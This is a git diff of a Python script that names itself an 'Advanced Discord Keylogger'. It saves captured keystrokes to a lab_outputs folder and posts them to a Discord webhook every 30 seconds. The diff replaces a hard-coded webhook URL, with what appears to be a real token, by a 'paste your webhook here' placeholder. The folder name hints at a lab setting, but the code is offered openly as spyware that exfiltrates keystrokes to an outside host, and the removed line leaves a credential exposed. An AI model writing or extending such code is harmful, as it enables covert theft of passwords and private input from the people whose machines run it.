@@ -8,7 +8,7 @@ import time
 import shutil
 
 #Housekeeping
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1445787110140543157/TNM_gJCLFJovTQne1eHjinggfaLZeum5Eoje9E9ywkouEzWTRMzYErQMHv0ybdMGRJCv"
+WEBHOOK_URL = "" #PASTE YOUR DISCORD WEBHOOK URL HERE
 save_dir = "lab_outputs"
 os.makedirs(save_dir, exist_ok=True)
 KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")
@@ -77,3 +77,4 @@ print("[*] Advanced Discord Keylogger is successfully running...")
 while True:
     time.sleep(30)  # every 30 seconds it sends data to discord sever
     send_to_discord()
+
